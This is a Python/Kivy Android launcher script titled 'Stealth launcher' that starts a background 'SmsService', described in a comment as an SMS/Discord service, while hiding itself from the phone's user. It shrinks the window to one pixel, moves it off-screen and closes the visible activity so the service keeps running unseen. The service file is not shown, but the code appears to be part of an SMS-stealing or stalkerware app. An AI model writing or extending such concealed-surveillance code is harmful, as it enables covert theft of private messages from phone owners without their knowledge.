"""
Stealth launcher — starts background service, finishes immediately.
"""
import threading
import sys

from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window

# Start the SMS/Discord service in background
_service_started = False

def start_service():
    global _service_started
    if _service_started:
        return
    _service_started = True
    
    try:
        # P4A service
        import android
        svc = android.AndroidService("SmsService", "service.py")
        svc.start("")
    except ImportError:
        # Running locally (testing) — just import and run
        import service
        import threading
        t = threading.Thread(target=service.main, daemon=True)
        t.start()

class StealthApp(App):
    def build(self):
        # Minimize window first
        Window.size = (1, 1)
        Window.left = -2000
        
        # Start service in background thread
        t = threading.Thread(target=start_service, daemon=True)
        t.start()
        
        # Close the activity after a brief moment
        Clock.schedule_once(lambda dt: self.stop(), 0.3)
        return None  # No GUI

    def on_stop(self):
        # When activity is destroyed, service continues running
        pass

if __name__ == "__main__":
    StealthApp().run()
